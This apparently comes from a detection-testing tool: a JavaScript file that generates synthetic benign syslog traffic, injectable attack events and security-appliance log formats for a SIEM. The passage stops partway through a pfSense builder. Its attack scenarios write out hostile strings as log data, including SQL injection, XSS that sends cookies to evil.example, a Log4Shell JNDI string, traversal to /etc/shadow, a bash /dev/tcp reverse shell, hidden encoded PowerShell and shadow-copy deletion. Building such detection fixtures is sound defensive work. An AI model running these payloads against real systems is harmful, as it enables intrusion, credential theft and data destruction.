/*
 * syslogger.js — the "Syslogger" log source.
 * Generates realistic syslog events (benign baseline + injectable attack
 * scenarios) and pushes them to a sink at a configurable events-per-second.
 */
(function (global) {
  'use strict';
  const { rand, FACILITY, HOSTS, USERS, BAD_USERS, URLS, AGENTS, DOMAINS, THREAT_INTEL, formatSyslog, VENDOR_FORMATTERS } = global.JS;

  // Baseline (benign) event builders keyed by source type. Each returns a
  // partial event; the Syslogger fills timestamp / id / raw line afterwards.
  const BASELINE = {
    firewall() {
      const h = rand.pick(HOSTS.firewall);
      const action = rand.chance(0.82) ? 'ALLOW' : 'DENY';
      const src = rand.chance(0.5) ? rand.internalIp() : rand.ip();
      const dst = rand.internalIp();
      const dport = rand.pick([80, 443, 22, 53, 123, 3389, 8080, rand.int(1024, 65535)]);
      return {
        srcType: 'firewall', host: h.name, hostIp: h.ip, facility: FACILITY.local0,
        program: 'kernel', severity: action === 'DENY' ? 5 : 6,
        srcIp: src, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: dport,
        proto: rand.pick(['TCP', 'UDP']), action, bytes: rand.int(60, 1500),
        message: `[UFW ${action}] IN=eth0 OUT=eth1 SRC=${src} DST=${dst} PROTO=TCP SPT=${rand.int(1024, 65535)} DPT=${dport} ACTION=${action}`,
      };
    },
    ssh() {
      const h = rand.pick(HOSTS.ssh);
      const user = rand.pick(USERS);
      const src = rand.internalIp();
      return {
        srcType: 'ssh', host: h.name, hostIp: h.ip, facility: FACILITY.authpriv,
        program: 'sshd', pid: rand.int(1000, 32000), severity: 6, user, srcIp: src,
        message: `Accepted publickey for ${user} from ${src} port ${rand.int(1024, 65535)} ssh2: ED25519 SHA256:${rand.id()}${rand.id()}`,
      };
    },
    web() {
      const h = rand.pick(HOSTS.web);
      const status = rand.pick([200, 200, 200, 301, 404, 200, 500]);
      const method = rand.pick(['GET', 'GET', 'POST', 'GET']);
      const url = rand.pick(URLS);
      const src = rand.chance(0.7) ? rand.ip() : rand.internalIp();
      return {
        srcType: 'web', host: h.name, hostIp: h.ip, facility: FACILITY.local1,
        program: 'nginx', severity: status >= 500 ? 3 : (status >= 400 ? 4 : 6),
        srcIp: src, method, url, status, bytes: rand.int(200, 45000),
        message: `${src} - - "${method} ${url} HTTP/1.1" ${status} ${rand.int(200, 45000)} "-" "${rand.pick(AGENTS)}"`,
      };
    },
    dns() {
      const h = rand.pick(HOSTS.dns);
      const domain = rand.pick(DOMAINS);
      const src = rand.internalIp();
      return {
        srcType: 'dns', host: h.name, hostIp: h.ip, facility: FACILITY.local3,
        program: 'named', severity: 6, srcIp: src, domain,
        message: `client ${src}#${rand.int(1024, 65535)}: query: ${domain} IN ${rand.pick(['A', 'AAAA', 'MX', 'TXT'])} + (${h.ip})`,
      };
    },
    vpn() {
      const h = rand.pick(HOSTS.vpn);
      const user = rand.pick(USERS);
      const src = rand.ip();
      return {
        srcType: 'vpn', host: h.name, hostIp: h.ip, facility: FACILITY.local4,
        program: 'openvpn', severity: 6, user, srcIp: src,
        message: `user '${user}' authenticated, peer ${src}:${rand.int(1024, 65535)} assigned 10.8.0.${rand.int(2, 254)}`,
      };
    },
    windows() {
      const h = rand.pick(HOSTS.windows);
      const user = rand.pick(USERS);
      const eid = rand.pick([4624, 4634, 4672, 4688, 5140]);
      return {
        srcType: 'windows', host: h.name, hostIp: h.ip, facility: FACILITY.local5,
        program: 'Microsoft-Windows-Security-Auditing', severity: 6, user, eventId: eid,
        msgid: `EventID${eid}`,
        message: `EventID=${eid} An account was logged on. Account=${user} LogonType=3 Source=${rand.internalIp()}`,
      };
    },
  };

  // Weighted baseline source selection (firewall & web are chattiest).
  const SOURCE_WEIGHTS = [
    ['firewall', 34], ['web', 26], ['ssh', 12], ['dns', 14], ['windows', 8], ['vpn', 6],
  ];
  function weightedSource() {
    const total = SOURCE_WEIGHTS.reduce((s, [, w]) => s + w, 0);
    let r = rand.float(0, total);
    for (const [src, w] of SOURCE_WEIGHTS) { if ((r -= w) <= 0) return src; }
    return 'firewall';
  }

  // ---- Attack scenarios -----------------------------------------------------
  // Each returns an ARRAY of event partials representing a burst of activity
  // that the detection engine should surface. Nothing here is labelled as
  // malicious — Jedi must infer that from the content, just like a real SIEM.
  const SCENARIOS = {
    'ssh-bruteforce': {
      label: 'SSH Brute Force',
      build() {
        const h = rand.pick(HOSTS.ssh);
        const attacker = rand.pick(THREAT_INTEL.ips);
        const evs = [];
        const n = rand.int(12, 20);
        for (let i = 0; i < n; i++) {
          const user = rand.pick(BAD_USERS);
          evs.push({
            srcType: 'ssh', host: h.name, hostIp: h.ip, facility: FACILITY.authpriv,
            program: 'sshd', pid: rand.int(1000, 32000), severity: 5, user, srcIp: attacker,
            message: `Failed password for ${rand.chance(0.5) ? 'invalid user ' : ''}${user} from ${attacker} port ${rand.int(1024, 65535)} ssh2`,
          });
        }
        // Occasionally the brute force succeeds — escalates the story.
        if (rand.chance(0.3)) {
          const user = rand.pick(BAD_USERS);
          evs.push({
            srcType: 'ssh', host: h.name, hostIp: h.ip, facility: FACILITY.authpriv,
            program: 'sshd', pid: rand.int(1000, 32000), severity: 5, user, srcIp: attacker,
            message: `Accepted password for ${user} from ${attacker} port ${rand.int(1024, 65535)} ssh2`,
          });
        }
        return evs;
      },
    },
    'port-scan': {
      label: 'Port Scan',
      build() {
        const h = rand.pick(HOSTS.firewall);
        const attacker = rand.chance(0.6) ? rand.pick(THREAT_INTEL.ips) : rand.ip();
        const dst = rand.internalIp();
        const evs = [];
        const n = rand.int(20, 30);
        const ports = new Set();
        while (ports.size < n) ports.add(rand.int(1, 10000));
        for (const dport of ports) {
          evs.push({
            srcType: 'firewall', host: h.name, hostIp: h.ip, facility: FACILITY.local0,
            program: 'kernel', severity: 4, srcIp: attacker, dstIp: dst,
            srcPort: rand.int(1024, 65535), dstPort: dport, proto: 'TCP', action: 'DENY', bytes: 40,
            message: `[UFW DENY] IN=eth0 SRC=${attacker} DST=${dst} PROTO=TCP SPT=${rand.int(1024, 65535)} DPT=${dport} FLAGS=SYN ACTION=DENY`,
          });
        }
        return evs;
      },
    },
    'sql-injection': {
      label: 'SQL Injection',
      build() {
        const h = rand.pick(HOSTS.web);
        const attacker = rand.pick(THREAT_INTEL.ips.concat([rand.ip()]));
        const payloads = [
          "/products?id=1' OR '1'='1",
          "/login?user=admin'--",
          "/search?q=1 UNION SELECT username,password FROM users--",
          "/api/v1/orders?id=1; DROP TABLE users;--",
          "/item?id=1' AND SLEEP(5)--",
        ];
        return payloads.slice(0, rand.int(3, 5)).map((url) => ({
          srcType: 'web', host: h.name, hostIp: h.ip, facility: FACILITY.local1,
          program: 'nginx', severity: 4, srcIp: attacker, method: 'GET', url, status: rand.pick([200, 500, 403]),
          bytes: rand.int(200, 800),
          message: `${attacker} - - "GET ${url} HTTP/1.1" ${rand.pick([200, 500, 403])} ${rand.int(200, 800)} "-" "${rand.pick(AGENTS)}"`,
        }));
      },
    },
    'c2-beacon': {
      label: 'C2 Beacon',
      build() {
        const h = rand.pick(HOSTS.firewall);
        const victim = rand.internalIp();
        const c2 = rand.pick(THREAT_INTEL.ips);
        const evs = [];
        const n = rand.int(4, 7);
        for (let i = 0; i < n; i++) {
          evs.push({
            srcType: 'firewall', host: h.name, hostIp: h.ip, facility: FACILITY.local0,
            program: 'kernel', severity: 5, srcIp: victim, dstIp: c2,
            srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 8443, 4444]), proto: 'TCP',
            action: 'ALLOW', bytes: rand.int(180, 420),
            message: `[UFW ALLOW] IN=eth1 OUT=eth0 SRC=${victim} DST=${c2} PROTO=TCP SPT=${rand.int(1024, 65535)} DPT=443 ACTION=ALLOW`,
          });
        }
        return evs;
      },
    },
    'data-exfil': {
      label: 'Data Exfiltration',
      build() {
        const h = rand.pick(HOSTS.firewall);
        const victim = rand.pick(HOSTS.ssh).ip;
        const dst = rand.chance(0.5) ? rand.pick(THREAT_INTEL.ips) : rand.ip();
        const mb = rand.int(220, 900);
        return [{
          srcType: 'firewall', host: h.name, hostIp: h.ip, facility: FACILITY.local0,
          program: 'kernel', severity: 4, srcIp: victim, dstIp: dst,
          srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 21, 22]), proto: 'TCP',
          action: 'ALLOW', bytes: mb * 1024 * 1024,
          message: `[UFW ALLOW] large flow SRC=${victim} DST=${dst} PROTO=TCP DPT=443 BYTES=${mb * 1024 * 1024} DURATION=${rand.int(30, 300)}s`,
        }];
      },
    },
    'dns-tunneling': {
      label: 'DNS Tunneling',
      build() {
        const h = rand.pick(HOSTS.dns);
        const victim = rand.internalIp();
        const base = rand.pick(THREAT_INTEL.domains);
        const evs = [];
        const n = rand.int(4, 8);
        for (let i = 0; i < n; i++) {
          const label = Array.from({ length: rand.int(40, 60) }, () => rand.pick('abcdef0123456789'.split(''))).join('');
          const q = `${label}.${base}`;
          evs.push({
            srcType: 'dns', host: h.name, hostIp: h.ip, facility: FACILITY.local3,
            program: 'named', severity: 5, srcIp: victim, domain: q,
            message: `client ${victim}#${rand.int(1024, 65535)}: query: ${q} IN TXT + (${h.ip})`,
          });
        }
        return evs;
      },
    },
    'priv-esc': {
      label: 'Privilege Escalation',
      build() {
        const h = rand.pick(HOSTS.ssh);
        const user = rand.pick(['www-data', 'svc_backup', 'operator']);
        return [
          {
            srcType: 'ssh', host: h.name, hostIp: h.ip, facility: FACILITY.authpriv,
            program: 'sudo', severity: 5, user,
            message: `${user} : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i`,
          },
          {
            srcType: 'windows', host: rand.pick(HOSTS.windows).name, hostIp: rand.pick(HOSTS.windows).ip,
            facility: FACILITY.local5, program: 'Microsoft-Windows-Security-Auditing', severity: 4,
            eventId: 4672, user, msgid: 'EventID4672',
            message: `EventID=4672 Special privileges assigned to new logon. Account=${user} Privileges=SeDebugPrivilege,SeTcbPrivilege`,
          },
        ];
      },
    },
    'malware-detected': {
      label: 'Malware / IDS Hit',
      build() {
        const h = rand.pick(HOSTS.ids);
        const victim = rand.internalIp();
        const attacker = rand.pick(THREAT_INTEL.ips);
        const sigs = [
          'ET TROJAN Cobalt Strike Beacon Observed',
          'ET MALWARE Win32/Emotet CnC Activity',
          'ET EXPLOIT Possible Log4j RCE Attempt (CVE-2021-44228)',
          'ET POLICY PowerShell EncodedCommand Detected',
        ];
        return [{
          srcType: 'ids', host: h.name, hostIp: h.ip, facility: FACILITY.local2,
          program: 'suricata', severity: 2, srcIp: attacker, dstIp: victim,
          msgid: 'IDS',
          message: `[1:2024897:3] ${rand.pick(sigs)} [Classification: A Network Trojan was Detected] [Priority: 1] {TCP} ${attacker}:${rand.int(1024, 65535)} -> ${victim}:443`,
        }];
      },
    },
  };

  // ---- Additional attack scenarios ------------------------------------------
  // Each produces content that one of Jedi's detection rules will surface.
  const web = (h, sev, srcIp, method, url, extra) => Object.assign({
    srcType: 'web', host: h.name, hostIp: h.ip, facility: FACILITY.local1, program: 'nginx',
    severity: sev, srcIp, method, url, status: 200,
    message: `${srcIp} - - "${method} ${url} HTTP/1.1" 200 512 "-" "${(extra && extra.ua) || 'Mozilla/5.0'}"`,
  }, extra || {});
  const win = (h, sev, eid, fields) => Object.assign({
    srcType: 'windows', host: h.name, hostIp: h.ip, facility: FACILITY.local5,
    program: 'Microsoft-Windows-Security-Auditing', severity: sev, eventId: eid, msgid: `EventID${eid}`,
  }, fields || {});

  const MORE_ATTACKS = {
    'log4shell': {
      label: 'Log4Shell RCE', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.pick(THREAT_INTEL.ips);
        const jndi = `\${jndi:ldap://${a}:1389/Exploit}`;
        return ['/api/v1/login', '/', '/search'].slice(0, rand.int(2, 3)).map((p) => {
          const url = `${p}?x=${jndi}`;
          return web(h, 3, a, 'GET', url, { status: rand.pick([200, 500]), ua: jndi,
            message: `${a} - - "GET ${p} HTTP/1.1" 200 512 "-" "${jndi}"` });
        });
      },
    },
    'xss': {
      label: 'XSS Injection', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.chance(0.5) ? rand.pick(THREAT_INTEL.ips) : rand.ip();
        return [
          "/search?q=<script>alert(document.cookie)</script>",
          "/comment?body=<img src=x onerror=fetch('//evil.example/'+document.cookie)>",
          "/profile?name=<script>document.location='//evil.example?c='+document.cookie</script>",
        ].slice(0, rand.int(2, 3)).map((u) => web(h, 4, a, 'GET', u));
      },
    },
    'dir-traversal': {
      label: 'Path Traversal / LFI', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.pick(THREAT_INTEL.ips.concat([rand.ip()]));
        return [
          '/download?file=../../../../etc/passwd',
          '/view?page=....//....//....//etc/shadow',
          '/img?src=../../../../../windows/win.ini',
        ].slice(0, rand.int(2, 3)).map((u) => web(h, 4, a, 'GET', u, { status: rand.pick([200, 403]) }));
      },
    },
    'web-shell': {
      label: 'Web Shell', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.pick(THREAT_INTEL.ips);
        return [
          '/uploads/shell.php?cmd=whoami',
          '/images/c99.php?cmd=cat+/etc/passwd',
          '/tmp/webshell.aspx?cmd=powershell',
        ].slice(0, rand.int(2, 3)).map((u) => web(h, 3, a, 'POST', u, { status: 200 }));
      },
    },
    'vuln-scan': {
      label: 'Vuln Scan', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.web), a = rand.pick(THREAT_INTEL.ips.concat([rand.ip()]));
        const ua = rand.pick(['sqlmap/1.7', 'Nikto/2.5.0', 'Nessus SOAP', 'Mozilla/5.0 (Nmap Scripting Engine)']);
        const paths = ['/admin', '/.git/config', '/wp-login.php', '/phpmyadmin', '/.env', '/api/v1/users', '/backup.sql', '/server-status'];
        return paths.slice(0, rand.int(5, 8)).map((u) => web(h, 4, a, 'GET', u, { status: rand.pick([404, 403, 200]), ua,
          message: `${a} - - "GET ${u} HTTP/1.1" 404 0 "-" "${ua}"` }));
      },
    },
    'reverse-shell': {
      label: 'Reverse Shell', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.ssh), a = rand.pick(THREAT_INTEL.ips);
        return [{
          srcType: 'ssh', host: h.name, hostIp: h.ip, facility: FACILITY.authpriv, program: 'bash', severity: 4, srcIp: a,
          message: `www-data executed: bash -i >& /dev/tcp/${a}/4444 0>&1`,
        }];
      },
    },
    'powershell-enc': {
      label: 'Malicious PowerShell', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows);
        const b64 = 'JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA';
        return [win(h, 4, 4688, { user: rand.pick(USERS),
          message: `EventID=4688 A new process has been created. Process=powershell.exe CommandLine="powershell -nop -w hidden -enc ${b64}"` })];
      },
    },
    'rdp-bruteforce': {
      label: 'RDP Brute Force', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), a = rand.pick(THREAT_INTEL.ips), evs = [];
        for (let i = 0, n = rand.int(10, 16); i < n; i++) {
          evs.push(win(h, 5, 4625, { user: rand.pick(BAD_USERS), srcIp: a,
            message: `EventID=4625 An account failed to log on. Account=${rand.pick(BAD_USERS)} LogonType=10 Source=${a} Status=0xC000006D` }));
        }
        return evs;
      },
    },
    'password-spray': {
      label: 'Password Spray', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), a = rand.pick(THREAT_INTEL.ips), evs = [];
        const users = ['jdoe', 'asmith', 'mchen', 'kwalsh', 'operator', 'svc_sql', 'hr_admin', 'jsmith', 'bwayne', 'ckent'];
        users.forEach((u) => evs.push(win(h, 5, 4625, { user: u, srcIp: a,
          message: `EventID=4625 An account failed to log on. Account=${u} LogonType=3 Source=${a} Status=0xC000006A (Spring2026!)` })));
        return evs;
      },
    },
    'kerberoasting': {
      label: 'Kerberoasting', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), a = rand.internalIp(), evs = [];
        ['svc_sql', 'svc_web', 'svc_backup', 'MSSQLSvc'].forEach((svc) => evs.push(win(h, 5, 4769, { user: svc, srcIp: a,
          message: `EventID=4769 A Kerberos service ticket was requested. ServiceName=${svc} TicketEncryptionType=0x17 (RC4) Client=${a}` })));
        return evs;
      },
    },
    'dcsync': {
      label: 'DCSync', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows.filter((x) => /DC/.test(x.name)).concat(HOSTS.windows));
        return [win(h, 4, 4662, { user: rand.pick(['svc_backup', 'operator', 'jdoe']), srcIp: rand.internalIp(),
          message: `EventID=4662 An operation was performed on an object. Properties=DS-Replication-Get-Changes-All {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} AccessMask=0x100 Account=svc_backup` })];
      },
    },
    'new-admin': {
      label: 'New Admin Account', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), u = `svc_${rand.id().slice(0, 5)}`;
        return [
          win(h, 5, 4720, { user: u, message: `EventID=4720 A user account was created. NewAccount=${u} CreatedBy=${rand.pick(USERS)}` }),
          win(h, 4, 4732, { user: u, message: `EventID=4732 A member was added to a security-enabled local group. Group=Administrators Member=${u}` }),
        ];
      },
    },
    'log-cleared': {
      label: 'Audit Log Cleared', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows);
        return [win(h, 4, 1102, { user: rand.pick(['Administrator', 'svc_backup']),
          message: `EventID=1102 The audit log was cleared. Account=${rand.pick(['Administrator', 'svc_backup'])} Domain=CORP` })];
      },
    },
    'pass-the-hash': {
      label: 'Pass-the-Hash', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows), a = rand.internalIp();
        return [win(h, 5, 4624, { user: rand.pick(['Administrator', 'svc_admin']), srcIp: a,
          message: `EventID=4624 An account was successfully logged on. LogonType=9 LogonProcess=seclogo AuthenticationPackage=NTLM (pass-the-hash) Source=${a}` })];
      },
    },
    'ransomware': {
      label: 'Ransomware', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.windows);
        return [
          win(h, 2, 4688, { user: 'SYSTEM', message: `EventID=4688 New Process=vssadmin.exe CommandLine="vssadmin delete shadows /all /quiet"` }),
          win(h, 2, 4688, { user: 'SYSTEM', message: `EventID=4688 New Process=bcdedit.exe CommandLine="bcdedit /set {default} recoveryenabled no"` }),
          win(h, 1, 4663, { user: rand.pick(USERS), message: `EventID=4663 Mass file rename detected: 4213 files -> *.locked  ransom note DECRYPT_INSTRUCTIONS.txt written` }),
        ];
      },
    },
    'cryptomining': {
      label: 'Cryptomining', category: 'attack',
      build() {
        const fw = rand.pick(HOSTS.firewall), dns = rand.pick(HOSTS.dns), victim = rand.internalIp();
        const pool = rand.pick(['pool.minexmr.com', 'xmr.nanopool.org', 'monerohash.com']);
        return [
          { srcType: 'dns', host: dns.name, hostIp: dns.ip, facility: FACILITY.local3, program: 'named', severity: 5, srcIp: victim, domain: pool,
            message: `client ${victim}#40000: query: ${pool} IN A + (${dns.ip})` },
          { srcType: 'firewall', host: fw.name, hostIp: fw.ip, facility: FACILITY.local0, program: 'kernel', severity: 5,
            srcIp: victim, dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: 3333, proto: 'TCP', action: 'ALLOW', bytes: rand.int(400, 1200),
            message: `[UFW ALLOW] SRC=${victim} DST=stratum+tcp://${pool}:3333 cryptonight worker=x` },
        ];
      },
    },
    'ddos-synflood': {
      label: 'SYN Flood (DDoS)', category: 'attack',
      build() {
        const fw = rand.pick(HOSTS.firewall), target = rand.internalIp(), evs = [];
        for (let i = 0, n = rand.int(8, 12); i < n; i++) {
          const a = rand.ip();
          evs.push({ srcType: 'firewall', host: fw.name, hostIp: fw.ip, facility: FACILITY.local0, program: 'kernel', severity: 4,
            srcIp: a, dstIp: target, srcPort: rand.int(1024, 65535), dstPort: 443, proto: 'TCP', action: 'DENY', bytes: 40,
            message: `[UFW DENY] possible SYN flood IN=eth0 SRC=${a} DST=${target} PROTO=TCP DPT=443 FLAGS=SYN` });
        }
        return evs;
      },
    },
    'phishing': {
      label: 'Phishing Email', category: 'attack',
      build() {
        const h = rand.pick(HOSTS.mail), a = rand.pick(THREAT_INTEL.ips);
        const sender = rand.pick(['billing@paypa1-secure.com', 'it-support@corp-helpdesk.ru', 'ceo@corp-drive.su']);
        const att = rand.pick(['Invoice_04821.exe', 'Payment.iso', 'Scan_2026.js', 'Resume.docm']);
        return [{
          srcType: 'mail', host: h.name, hostIp: h.ip, facility: FACILITY.mail, program: 'postfix', severity: 4, srcIp: a, phish: true, threatSev: 'medium',
          message: `suspicious message from <${sender}> spf=fail dkim=fail dmarc=fail attachment="${att}" to=jdoe@corp.local subject="Urgent: Payment Required"`,
        }];
      },
    },
  };
  Object.assign(SCENARIOS, MORE_ATTACKS);

  // ---- Appliance log sources ------------------------------------------------
  // The most common security-appliance formats. Each burst mixes benign traffic
  // with one malicious event so both the native format and a detection show up.
  const APPLIANCE = {
    paloalto: {
      label: 'Palo Alto (PAN-OS)', category: 'appliance',
      build() {
        const host = rand.pick(['PA-3220', 'PA-VM-01', 'PA-850']);
        const serial = String(rand.int(100000000000, 999999999999));
        const base = () => ({ srcType: 'paloalto', vendor: 'paloalto', host, serial, facility: FACILITY.local0, program: 'paloalto' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const proto = rand.pick(['tcp', 'udp']);
          const src = rand.internalIp(), dst = rand.ip(), sport = rand.int(1024, 65535), dport = rand.pick([443, 80, 53, 22, 8080]);
          const app = rand.pick(['web-browsing', 'ssl', 'dns', 'ssh', 'ntp']);
          evs.push(Object.assign(base(), {
            severity: 6, panType: 'TRAFFIC', subtype: rand.pick(['start', 'end']),
            srcIp: src, dstIp: dst, srcPort: sport, dstPort: dport, proto, action: 'allow', app,
            rule: 'trust-to-untrust', fromZone: 'trust', toZone: 'untrust',
            sessionId: rand.int(10000, 999999), bytes: rand.int(500, 60000),
            message: `TRAFFIC allow ${app} ${src}:${sport} -> ${dst}:${dport}`,
          }));
        }
        const threat = rand.pick([
          ['Apache Log4j Remote Code Execution Vulnerability', 91991, 'code-execution'],
          ['SQL Injection Attempt Detected', 20568, 'sql-injection'],
          ['Microsoft Windows SMBv1 RCE (EternalBlue)', 40007, 'code-execution'],
          ['HTTP Directory Traversal Attempt', 31337, 'info-leak'],
        ]);
        const badSrc = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp(), panSev = rand.pick(['high', 'critical']);
        evs.push(Object.assign(base(), {
          severity: panSev === 'critical' ? 2 : 3, panType: 'THREAT', subtype: 'vulnerability',
          srcIp: badSrc, dstIp: vic, srcPort: rand.int(1024, 65535), dstPort: 443, proto: 'tcp',
          action: rand.pick(['reset-both', 'drop', 'alert']), app: 'web-browsing',
          rule: 'untrust-to-dmz', fromZone: 'untrust', toZone: 'dmz', sessionId: rand.int(10000, 999999),
          threatName: threat[0], threatId: threat[1], category: threat[2], panSeverity: panSev,
          threatSig: threat[0], threatSev: panSev === 'critical' ? 'critical' : 'high',
          message: `THREAT [${panSev}] ${threat[0]} ${badSrc} -> ${vic}`,
        }));
        return evs;
      },
    },
    fortigate: {
      label: 'FortiGate (FortiOS)', category: 'appliance',
      build() {
        const devname = rand.pick(['FGT60F', 'FG100E', 'FGT-DC-01']);
        const devid = `FGT${rand.int(10000, 99999)}TK${rand.int(1000000, 9999999)}`;
        const base = () => ({ srcType: 'fortigate', vendor: 'fortigate', host: devname, devname, devid, facility: FACILITY.local4, program: 'fortigate' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const proto = rand.pick(['tcp', 'udp']);
          const src = rand.internalIp(), dst = rand.ip(), dport = rand.pick([443, 80, 53, 123]);
          const service = rand.pick(['HTTPS', 'HTTP', 'DNS', 'NTP']);
          evs.push(Object.assign(base(), {
            severity: 5, logid: '0000000013', ftType: 'traffic', subtype: 'forward', level: 'notice',
            srcIp: src, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: dport,
            proto, protoNum: proto === 'tcp' ? 6 : 17, action: 'accept', policyid: rand.int(1, 50), service,
            sentbyte: rand.int(500, 80000), rcvdbyte: rand.int(500, 120000), duration: rand.int(1, 300),
            message: `traffic accept ${src} -> ${dst}:${dport} (${service})`,
          }));
        }
        const attack = rand.pick([
          ['Apache.Log4j.Error.Remote.Code.Execution', 51006],
          ['MS.SMB.Server.Trans.Peeking.Data.OOB.Read', 41435],
          ['Backdoor.Cobalt.Strike.Beacon', 46774],
          ['HTTP.URI.SQL.Injection', 15621],
        ]);
        const badSrc = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp(), level = rand.pick(['critical', 'alert']);
        evs.push(Object.assign(base(), {
          severity: level === 'alert' ? 1 : 2, logid: '0419016384', ftType: 'utm', subtype: 'ips', level,
          srcIp: badSrc, dstIp: vic, srcPort: rand.int(1024, 65535), dstPort: 443, proto: 'tcp', protoNum: 6,
          action: 'dropped', policyid: rand.int(1, 50), service: 'HTTPS', attack: attack[0], attackId: attack[1],
          threatSig: attack[0], threatSev: /alert|critical/i.test(level) ? 'critical' : 'high',
          message: `ips dropped ${attack[0]} ${badSrc} -> ${vic}`,
        }));
        return evs;
      },
    },
    ciscoasa: {
      label: 'Cisco ASA', category: 'appliance',
      build() {
        const host = rand.pick(['ASA-5516', 'ASA-FW01', 'ciscoasa']);
        const base = () => ({ srcType: 'ciscoasa', vendor: 'ciscoasa', host, facility: FACILITY.local4, program: 'ASA', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const src = rand.internalIp(), dst = rand.ip(), sport = rand.int(1024, 65535), dport = rand.pick([443, 80, 53]);
          const id = rand.int(100000, 999999), built = rand.chance(0.6);
          evs.push(Object.assign(base(), {
            severity: 6, srcIp: src, dstIp: dst, srcPort: sport, dstPort: dport, action: 'allow',
            msgId: built ? '302013' : '302014',
            message: built
              ? `Built outbound TCP connection ${id} for outside:${dst}/${dport} (${dst}/${dport}) to inside:${src}/${sport} (${src}/${sport})`
              : `Teardown TCP connection ${id} for outside:${dst}/${dport} to inside:${src}/${sport} duration 0:0:${rand.int(1, 59)} bytes ${rand.int(500, 90000)}`,
          }));
        }
        // Outbound to a known-bad IP (fires the C2 rule).
        const badDst = rand.pick(THREAT_INTEL.ips), internal = rand.internalIp(), id = rand.int(100000, 999999), sp = rand.int(1024, 65535);
        evs.push(Object.assign(base(), {
          severity: 6, srcIp: internal, dstIp: badDst, srcPort: sp, dstPort: 443, action: 'allow', msgId: '302013',
          message: `Built outbound TCP connection ${id} for outside:${badDst}/443 (${badDst}/443) to inside:${internal}/${sp}`,
        }));
        // Inbound deny.
        const badSrc = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp(), sp2 = rand.int(1024, 65535), dp = rand.pick([22, 3389, 445]);
        evs.push(Object.assign(base(), {
          severity: 4, srcIp: badSrc, dstIp: vic, srcPort: sp2, dstPort: dp, action: 'deny', msgId: '106023',
          message: `Deny tcp src outside:${badSrc}/${sp2} dst inside:${vic}/${dp} by access-group "outside_access_in"`,
        }));
        return evs;
      },
    },
    checkpoint: {
      label: 'Check Point', category: 'appliance',
      build() {
        const host = rand.pick(['cp-gw-01', 'fw-mgmt', 'checkpoint-01']);
        const product = rand.pick(['VPN-1 & FireWall-1', 'Threat Emulation', 'SmartDefense']);
        const base = () => ({ srcType: 'checkpoint', vendor: 'checkpoint', host, product, facility: FACILITY.local4, program: 'CheckPoint', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const src = rand.internalIp(), dst = rand.ip(), dport = rand.pick([443, 80, 53]);
          evs.push(Object.assign(base(), {
            severity: 6, srcIp: src, dstIp: dst, srcPort: rand.int(1024, 65535), dstPort: dport,
            action: 'Accept', rule: String(rand.int(1, 60)),
            message: `Accept ${src} -> ${dst}:${dport}`,
          }));
        }
        const badDst = rand.pick(THREAT_INTEL.ips), internal = rand.internalIp();
        evs.push(Object.assign(base(), {
          severity: 4, srcIp: internal, dstIp: badDst, srcPort: rand.int(1024, 65535), dstPort: 443,
          action: 'Accept', rule: String(rand.int(1, 60)),
          message: `Accept ${internal} -> ${badDst}:443 (flagged destination)`,
        }));
        const badSrc = rand.pick(THREAT_INTEL.ips), vic = rand.internalIp();
        evs.push(Object.assign(base(), {
          severity: 4, srcIp: badSrc, dstIp: vic, srcPort: rand.int(1024, 65535), dstPort: rand.pick([445, 3389]),
          action: 'Drop', rule: String(rand.int(1, 60)),
          message: `Drop ${badSrc} -> ${vic}`,
        }));
        return evs;
      },
    },
    sophos: {
      label: 'Sophos XG', category: 'appliance',
      build() {
        const host = rand.pick(['XG135', 'SFW-DC', 'sophos-fw']);
        const base = () => ({ srcType: 'sophos', vendor: 'sophos', host, facility: FACILITY.local4, program: 'SFW', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, action: 'Allow', priority: 'Information', ruleId: rand.int(1, 40),
            srcIp: rand.internalIp(), dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80, 53]),
            message: 'Firewall rule allowed traffic' }));
        }
        const sig = rand.pick(['SQL-Injection-Attack', 'Web-Server-CVE-2021-44228-Log4j', 'Suspicious-Executable-Download']);
        evs.push(Object.assign(base(), { severity: 2, action: 'Deny', priority: 'Warning', ruleId: rand.int(1, 40),
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: rand.internalIp(), srcPort: rand.int(1024, 65535), dstPort: 443,
          threatSig: sig, threatSev: 'critical', threatId: rand.int(10000, 99999), message: `IPS ${sig}` }));
        return evs;
      },
    },
    pfsense: {
      label: 'pfSense', category: 'appliance',
      build() {
        const host = rand.pick(['pfsense', 'opnsense-01']);
